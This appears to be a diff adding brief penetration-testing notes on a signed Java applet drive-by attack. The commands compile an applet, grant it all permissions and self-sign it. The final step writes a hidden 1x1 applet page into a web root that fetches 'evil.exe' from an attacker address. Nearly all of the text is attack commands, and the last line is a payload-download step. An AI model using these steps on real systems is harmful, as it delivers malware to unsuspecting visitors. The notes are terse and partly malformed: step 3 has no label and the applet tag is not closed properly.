@@ -1,0 +1,17 @@
+1. Java applet compilation  compilation
+
+javac Java.java
+
+echo “Permissions: all-permissions” > /root/manifest.txt
+
+jar cvf Java.jar Java.class
+
+2. Signing the java applet
+
+keytool -genkey -alias signapplet -keystore mykeystore -keypass mykeypass -storepass password123
+
+jarsigner -keystore mykeystore -storepass password123 -keypass mykeypass -signedjar SignedJava.jar Java.jar signapplet
+
+3. 
+
+echo '<applet width="1" height="1" id="Java Secure" code="Java.class" archive="SignedJava.jar"><param name="1" value="http://10.11.0.41:80/evil.exe"><applet>' > /var/www/html/java.html
